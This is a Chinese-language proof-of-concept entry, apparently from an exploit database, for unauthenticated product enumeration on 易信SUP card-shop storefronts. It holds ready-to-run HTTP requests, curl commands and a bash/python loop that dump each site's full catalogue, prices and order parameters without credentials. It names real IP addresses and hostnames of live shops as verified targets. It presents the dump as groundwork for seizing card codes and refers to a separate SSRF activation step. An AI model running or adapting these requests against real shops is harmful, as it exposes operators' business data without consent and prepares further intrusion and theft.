# 易信SUP 客户站 /api/customer/Home/* 商品展示面全未授权（GoodsList 全量列表 + GoodsCategoryList 分类树 + GetGoods 详情）

- **code**: yixin-sup-customer-home-goodslist-unauth-enumerate
- **kind**: poc
- **category**: unauthorized
- **component**: 易信SUP（易信/易售 SUP 商城前台 /api/customer，Go 后端，1.0.44）
- **versions**: 1.0.44
- **severity**: medium
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: task#616 / finding 1291，2026-11-06（ARTEX 执行机，curl.exe --noproxy "*" 直连，全程不带 Cookie/Token）：在 154.12.94.23（Host: sup.yixinsup.top.）① POST /api/console/Activate/GetStatus {} → 200 activated=true、locked=false，排除授权闸干扰；② POST /api/customer/Login/GuestLogin {} → {"code":1,"message":"游客登录已关闭"}，确立无凭据基线；③ GET /api/customer/Home/GoodsList?goods_category_id=0&page=1&list_rows=100 → 200 {"code":0,"data":{...,"count":108}} 真实商品明细（价格/库存/buy_params）；④ 第二台独立实例 154.12.94.216（Host: shop.lmbb77.top.）同请求 → 200 count=14；⑤ GET /api/customer/Home/GetGoods?id=127 → 200 单品 name/price/buy_params；⑥ POST /api/customer/Home/GoodsCategoryList → 完整分类树 35 个子类。判定成立依据：游客登录已关闭仍返回真实经营数据，且全链路零凭据、两实例互证。历史同缺陷（finding 1290）：43.129.214.240 Host: niangao.site. POST GoodsList → count=474。
- **path**: pocs/yixin-sup-customer-home-goodslist-unauth-enumerate/poc.http
- **tags**: 易信sup, 易售sup, sup, 未授权, unauthorized, api/customer, goodslist, goodscategorylist, getgoods, 商品枚举, 分类树, 商品详情, host尾点, go
- **created_at**: 2026-11-06T02:30:25.577Z
- **engine**: 154.12.94.23（Host: sup.yixinsup.top.）、154.12.94.216（Host: shop.lmbb77.top.）；同缺陷历史实例 43.129.214.240（Host: niangao.site.）
- **found_by**: vuln-scan

## 描述

易信SUP 客户侧（发卡/寄售商城前台）把整条商品展示面都放在 /api/customer/Home/* 且未挂鉴权：商品分页列表、商品分类树、单品详情（含 buy_params 下单参数、价格、库存、上下架）全部无 token 可读，常见于实例已激活且 GuestLogin 已关闭的场景。可用于外部零凭据摸清目标站经营品类、定价与 SKU 全集，为后续取卡/下单缩小靶面。前提：目标 80 可达、Host 必须写该实例绑定的 vhost 且带尾点、实例已激活。

## 用法

```
前置三步（缺一易假阴性）：
1) IP:80 可达；
2) Host 必须是该实例绑定的 vhost 且**带尾点**（如 sup.yixinsup.top.，不带尾点被 RST）；
3) 实例必须已激活：POST /api/console/Activate/GetStatus，body 字面量 {} + Content-Type: application/json，确认 data.activated=true（未激活先走同产品 Activate/GoSystem auth_server SSRF 条目激活）。

复现（全程不带 Cookie/Token）：
A. 阴性基线：POST /api/customer/Login/GuestLogin {} → {"code":1,"message":"游客登录已关闭"}
B. 全量列表（GET 版最省事，list_rows 取 100~200）：
   curl.exe -sS --noproxy "*" -H "Host: TARGET_VHOST." "http://TARGET_IP/api/customer/Home/GoodsList?goods_category_id=0&page=1&list_rows=100"
   → 200 {"code":0,"data":{"data":[...],"count":N}}
   POST 版等价：POST 同路径，JSON {"list_rows":200,"page":1}
C. 分类树：POST /api/customer/Home/GoodsCategoryList（body {}）→ 完整多级分类
D. 单品详情（必须用 GET?id=，POST 无效）：GET /api/customer/Home/GetGoods?id=127 → 200 name/price/buy_params
E. 按 count 翻页取全量，落地 goods_all.json；按 is_card_code=true 圈出卡密类商品优先取卡。

判据：200 + code:0 + data.count 为正 + data.data[] 有真实商品名/价格/buy_params。

失败常见原因：RST/空 → Host 缺尾点或不是该实例 vhost；403「系统未授权」→ 实例未激活（先激活）；400 → body 非 JSON 或缺 page/list_rows；返回 SPA 首页 HTML → 反代落到默认站点，换 Host/端口；GetGoods 用 POST 没回显 → 改 GET + id 查询串。
```

## 正文

```
# 易信SUP 客户站 /api/customer/Home/* 全商品面未授权
# 目标示例：154.12.94.23（Host: sup.yixinsup.top.）/ 154.12.94.216（Host: shop.lmbb77.top.）
# 判据：200 + {"code":0,"data":{...,"count":N},"message":"ok"}
# 前提：实例已激活（GetStatus.activated=true）；Host 带尾点；全程无 Cookie/Token

### 0) 预检：实例必须已激活，否则业务接口回 403「系统未授权」
POST /api/console/Activate/GetStatus HTTP/1.1
Host: sup.yixinsup.top.
Content-Type: application/json
Content-Length: 2

{}

# => 200 {"code":0,"data":{"activated":true,"locked":false,"status":1,...}}
#    activated=true 即可开打；未激活先走同产品的 Activate/GoSystem auth_server SSRF 激活

### 1) 阴性基线：游客登录是关的，证明后续确实无凭据
POST /api/customer/Login/GuestLogin HTTP/1.1
Host: sup.yixinsup.top.
Content-Type: application/json
Content-Length: 2

{}

# => 200 {"code":1,"data":null,"message":"游客登录已关闭"}

### 2) 全量商品列表 —— GET 版（goods_category_id=0 表全部，list_rows 控制每页）
GET /api/customer/Home/GoodsList?goods_category_id=0&page=1&list_rows=100 HTTP/1.1
Host: sup.yixinsup.top.
Connection: close

# => 200 {"code":0,"data":{"data":[
#   {"id":127,"name":"音乐极速手工赞","price":0.02805,"is_card_code":false,"stock":-1,
#    "buy_params":[...],"status":1}, ...
# ],"count":108},"message":"ok"}

# 字段：id=后续详情/下单主键；is_card_code=是否卡密类（直接决定要不要去取卡面）；
#       stock=-1 多为不限量/上游代充；buy_params=下单必填参数；status=上下架

### 3) 等价 POST 版（同一逻辑，body 为 JSON）
POST /api/customer/Home/GoodsList HTTP/1.1
Host: sup.yixinsup.top.
Content-Type: application/json
Content-Length: 26

{"list_rows":200,"page":1}

### 4) 完整分类树（35 个子类，body 用空 JSON）
POST /api/customer/Home/GoodsCategoryList HTTP/1.1
Host: sup.yixinsup.top.
Content-Type: application/json
Content-Length: 2

{}

### 5) 单品详情 —— 必须 GET + 查询串，POST 取不到
GET /api/customer/Home/GetGoods?id=127 HTTP/1.1
Host: sup.yixinsup.top.
Connection: close

# => 200 {"code":0,"data":{"id":127,"name":"音乐极速手工赞","price":0.02805,"buy_params":[...]}}

### 6) 全量落地（curl.exe 直连，含 Host 尾点；按 count 算页数）
T=http://154.12.94.23
H='Host: sup.yixinsup.top.'
curl.exe -sS --noproxy "*" -H "$H" \
  "$T/api/customer/Home/GoodsList?goods_category_id=0&page=1&list_rows=1" > p1.json
CNT=$(python -c "import json;print(json.load(open('p1.json'))['data']['count'])")
PAGES=$(( (CNT + 199) / 200 ))
for i in $(seq 1 $PAGES); do
  curl.exe -sS --noproxy "*" -H "$H" \
    "$T/api/customer/Home/GoodsList?goods_category_id=0&page=$i&list_rows=200" > "gl_$i.json"
  sleep 1
done
python - <<'EOF'
import json,glob
rows=[r for f in sorted(glob.glob('gl_*.json')) for r in json.load(open(f))['data']['data']]
json.dump(rows,open('goods_all.json','w'),ensure_ascii=False,indent=1)
print("total",len(rows),"card",sum(1 for r in rows if r.get('is_card_code')))
EOF
# 然后对 is_card_code=true 的 id 逐个 GET /api/customer/Home/GetGoods?id=<id> 取 buy_params

### 7) 换实例/换 vhost 的注意点
# 同一 IP 常挂多站，Host 必须是该实例自己的绑定域名且带尾点；卡商站同套系统通用
# 实测清单：sup.yixinsup.top. → count=108；shop.lmbb77.top. → count=14；niangao.site. → count=474

```
